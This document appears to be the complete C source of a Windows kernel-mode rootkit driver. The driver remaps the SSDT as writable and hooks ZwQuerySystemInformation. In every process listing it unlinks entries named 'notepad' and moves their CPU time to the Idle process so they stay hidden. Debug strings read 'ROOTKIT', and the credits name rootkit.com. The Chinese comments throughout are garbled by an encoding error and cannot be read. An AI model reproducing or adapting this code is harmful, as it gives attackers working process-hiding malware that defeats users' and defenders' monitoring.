#include "ntddk.h"

#pragma pack(1)//�����ڴ�������������һ���д�ڴ� <<-----
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //��������checked build�汾
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

PMDL g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
//�����ڴ�������������һ���д�ڴ�  ----->>


//Ϊ�˹�סSSDT��  ����4���궨��  <<----
//���SSDT��ַ��
#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

//��ú�����SSDT�е�������
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)

//�����Լ���hook������ԭϵͳ�����ĵ�ַ
//InterlockedExchange(a,b)����ԭ�Ӳ����ķ�ʽ������������a, b������a��ǰ��ֵ
#define HOOK_SYSCALL(_Function, _Hook, _Orig ) \
_Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

//ж��hook����
#define UNHOOK_SYSCALL(_Function, _Hook, _Orig ) \
InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
//								  ---->>


//�������ֽṹ
struct _SYSTEM_THREADS
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientIs;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
	ULONG ContextSwitchCount;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
};

struct _SYSTEM_PROCESSES
{
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	ULONG ProcessId;
	ULONG InheritedFromProcessId;
	ULONG HandleCount;
	ULONG Reserved2[2];
	VM_COUNTERS VmCounters;
	IO_COUNTERS IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER DpcTime;
	LARGE_INTEGER InterruptTime;
	ULONG InterruptCount;
};

NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
							   IN ULONG SystemInformationClass,
							   IN PVOID SystemInformation,
							   IN ULONG SystemInformationLength,
							   OUT PULONG ReturnLength);


typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
											 ULONG SystemInformationCLass,
											 PVOID SystemInformation,
											 ULONG SystemInformationLength,
											 PULONG ReturnLength
											 );

ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;

// Added by Creative of rootkit.com
LARGE_INTEGER m_UserTime;
LARGE_INTEGER m_KernelTime;
//���ǵ�hook���������˵���"_root_"��ͷ�Ľ���

NTSTATUS NewZwQuerySystemInformation(
									 IN ULONG SystemInformationClass,
									 IN PVOID SystemInformation,
									 IN ULONG SystemInformationLength,
									 OUT PULONG ReturnLength)
{ 
	NTSTATUS ntStatus;
	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength );
	if( NT_SUCCESS(ntStatus)) 
	{
		// Asking for a file and directory listing
		if(SystemInformationClass == 5)//���н�����Ϣ
		{
			// �о�ϵͳ��������
			// Ѱ����"_root_"��ͷ�Ľ���
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;
			while(curr)
			{
				DbgPrint("Current item is %x\n", curr);
				if (curr->ProcessName.Buffer != NULL)
				{
					KdPrint(("%wZ\n",&(curr->ProcessName)));
					if(0 == memcmp(curr->ProcessName.Buffer, L"notepad", 12))
					{
						KdPrint(("Find notepad.exe\n\n\n\n\n"));
						//����ʱ��
						m_UserTime.QuadPart += curr->UserTime.QuadPart;
						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
						if(prev) // Middle or Last entry
						{
							if(curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;
							//������м䣬����ɾ��_root_��һ��
							else // we are last, so make prev the end
								prev->NextEntryDelta = 0;//���_root_�����һ����0
						}
						else
						{
							if(curr->NextEntryDelta)
							{
								KdPrint(("we are first in the list, so move it forward\n\n\n"));
								// we are first in the list, so move it forward
								(char *)SystemInformation += curr->NextEntryDelta;
							}//����һ����Ϊͷ���
							else // Ψһ�Ľ���
								SystemInformation = NULL;
						}
					}
				}
				else // Idle process���
				{
					// ��_root_���̵�ʱ��Ӹ�Idle���̣�Idle�ƿ���ʱ��
					KdPrint(("�� ���̵�ʱ��Ӹ�Idle���̣�Idle�ƿ���ʱ��\n\n\n"));
					curr->UserTime.QuadPart += m_UserTime.QuadPart;
					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
					// ����ʱ�䣬Ϊ��һ�ι���
					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
					KdPrint(("����ʱ�䣬Ϊ��һ�ι���\n\n\n"));
				}
				prev = curr;
				if(curr->NextEntryDelta)
				{
					((char *)curr += curr->NextEntryDelta);
				//curr����ƶ����
					KdPrint(("curr����ƶ����\n\n\n"));
				}
				else curr = NULL;
			}
		}
		else if (SystemInformationClass == 8) // �о�ϵͳ����ʱ��
		{
			struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
			times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
			KdPrint(("�о�ϵͳ����ʱ��\n\n\n"));
		}
		
	}
	return ntStatus;
}


VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("ROOTKIT: OnUnload called\n");
	// ж��hook
	UNHOOK_SYSCALL( ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation );
	// �������ͷ�MDL
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, 
					 IN PUNICODE_STRING theRegistryPath)
{
	DbgPrint("ROOTKIT: Start\n");
	// ע��һ��ж�صķַ���������Ӧ�ò㹵ͨ
	theDriverObject->DriverUnload = OnUnload; 
	// ��ʼ��ȫ��ʱ��Ϊ��
	// �⽫����ʱ�����⣬��������������������˽��̣���ʱ������Ļ᲻�䣬cpu 100%
	m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
	// ����ɵĺ�����ַ
	OldZwQuerySystemInformation =(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

	// ��SSDT���䵽���ǵ������Ա��޸���Ϊ��д����  <<---
	g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
	if(!g_pmdlSystemCall)
		return STATUS_UNSUCCESSFUL;
	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	// �ı�MDL��Flags����Ϊ��д����Ȼ��д��Ȼ�ɶ�����ִ��
	g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
	//												--->>

	// ���˺꣬��ԭ����Zw*�滻�����ǵ�New*��������������������ǵ���Ҫ��������ͻ����SSDT�ı����������ú������Ŀ�꺯����������ʣ�¾���Ĺ���������
	HOOK_SYSCALL( ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation ); 
	return STATUS_SUCCESS;
}


